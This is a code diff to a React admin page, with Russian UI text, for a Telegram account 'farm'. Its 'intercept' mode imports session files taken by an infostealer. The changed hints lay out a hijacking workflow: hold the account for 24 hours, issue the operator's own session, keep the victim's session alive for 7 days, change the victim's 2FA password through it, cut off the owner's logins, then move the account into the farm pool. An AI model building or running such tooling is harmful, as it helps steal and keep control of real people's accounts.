@@ -180,7 +180,7 @@ const constraintMeta = (account) => {
   return { label: '—', chip: 'mute' };
 };
 
-const interceptQuiet = (account) => account?.origin === 'intercept' && !account?.intercept_can_adopt;
+const interceptQuiet = (account) => account?.origin === 'intercept' && !account?.intercept_reauthorized_at;
 
 const interceptChip = (label) => {
   if (label === 'Холд 24 часа' || label === 'Ожидает переавторизацию') {
@@ -189,7 +189,7 @@ const interceptChip = (label) => {
   if (label === 'Можно заливать в основной пул') {
     return 'pool';
   }
-  if (label === 'Идёт переавторизация') {
+  if (label === 'Идёт переавторизация' || label === 'Родительская сессия жива' || label === 'Прогрев новой сессии') {
     return 'info';
   }
   if (
@@ -975,7 +975,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
       {uploadSummary && !prepareStatus ? (
         <p className="acc-flash">
           Залито {uploadSummary.created} сессий.
-          {isIntercept ? ' Первые 24 часа не трогаем. Потом выпускаем свою сессию, старую завершаем и только после этого можно переводить в общий пул.' : (
+          {isIntercept ? ' Первые 24 часа не трогаем. Затем выпускаем свою сессию, родительскую оставляем на 7 дней, прогреваем новую и только потом переводим в общий пул.' : (
             <>
               {' '}
               <button type="button" className="acc-btn acc-btn--primary" onClick={handlePrepare} disabled={isPreparing}>
@@ -1272,7 +1272,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                 </h2>
                 <p>
                   {panel === 'import' && (isIntercept
-                    ? 'ZIP или .session из стилера. Первые 24 часа холд. Затем своя сессия вместо залитой, и только потом перевод в общий пул.'
+                    ? 'ZIP или .session из стилера. Первые 24 часа холд. Затем своя сессия рядом с родительской, прогрев 7 дней, и только потом перевод в общий пул.'
                     : 'ZIP с .session, одиночный .session или CSV.')}
                   {panel === 'add' && 'QR или код из SMS. 2FA — если включена.'}
                   {panel === 'proxy' && 'Список для автоназначения при заливе и подключении.'}
@@ -1456,9 +1456,9 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                 </div>
                 <p className="form-hint">
                   {interceptQuiet(drawerAccount)
-                    ? 'Пока стоит холд, сессию не открываем и устройства не трогаем. Через 24 часа выпустим свою сессию и завершим залитую.'
+                    ? 'Пока стоит холд, сессию не открываем и устройства не трогаем. Через 24 часа выпустим свою сессию и оставим родительскую ещё на 7 дней.'
                     : isIntercept
-                      ? 'Онлайн 24/7 на нашей сессии. Новые чужие входы обрываем. Когда метка «Можно заливать в основной пул» — переводите в ферму.'
+                      ? 'Онлайн 24/7 на новой и родительской сессии. Чужие входы обрываем. 2FA меняйте через родителя. Когда метка «Можно заливать в основной пул» — переводите новую в ферму.'
                       : 'Старые устройства не трогаем. Новые входы и незавершённые попытки обрываем. «Код из Telegram» даёт 15 минут на ваш вход. «Зафиксировать устройства» запоминает текущий список как свои.'}
                   {guardPauseLabel(drawerAccount) ? ` Пауза до ${guardPauseLabel(drawerAccount)}.` : ''}
                 </p>
@@ -1507,7 +1507,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                   </button>
                 </div>
                 <p className="form-hint">
-                  Все обращения аккаунта к Telegram: задачи, прогрев, вход в онлайн, чтение каналов и остальное.
+                  Все обращения аккаунта к Telegram: задачи, прогрев, вход в онлайн, чтение каналов и остальное. Хранятся 3 суток.
                 </p>
                 {telegramLogsLoading && telegramLogs.length === 0 ? <p className="form-hint">Загружаем логи...</p> : null}
                 {telegramLogsError ? <p className="acc-flash acc-flash--error">{telegramLogsError}</p> : null}
@@ -1534,7 +1534,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                   ? ` ${WARMUP_STATUS_LABELS[drawerAccount.warmup_status] || drawerAccount.warmup_status}.`
                   : ''}
               </p>
-              {isIntercept && drawerAccount.intercept_can_adopt ? (
+              {isIntercept && drawerAccount.intercept_reauthorized_at ? (
                 <div className="acc-2fa">
                   {!twoFaOpen ? (
                     <button
@@ -1552,7 +1552,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                   ) : (
                     <>
                       <h3>Облачный пароль</h3>
-                      <p className="form-hint">Установка или смена 2FA. Если пароль уже есть — укажите текущий. Почта нужна для восстановления, код из письма введёте следующим шагом.</p>
+                      <p className="form-hint">2FA меняется через родительскую сессию, пока она жива. Если пароль уже есть — укажите текущий. Почта нужна для восстановления, код из письма введёте следующим шагом.</p>
                       <div className="form-group">
                         <label htmlFor="acc-2fa-current">Текущий пароль</label>
                         <input
@@ -1686,7 +1686,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                   className="acc-btn acc-btn--dark"
                   onClick={() => handleAdoptSessions(drawerAccount)}
                   disabled={isIntercept && !drawerAccount.intercept_can_adopt}
-                  title={isIntercept && !drawerAccount.intercept_can_adopt ? 'Сначала дождитесь переавторизации' : undefined}
+                  title={isIntercept && !drawerAccount.intercept_can_adopt ? 'Новую сессию можно переводить в общий пул через 7 дней после переавторизации' : undefined}
                 >
                   {isIntercept ? 'Перевести в общий пул' : 'Зафиксировать устройства'}
                 </button>
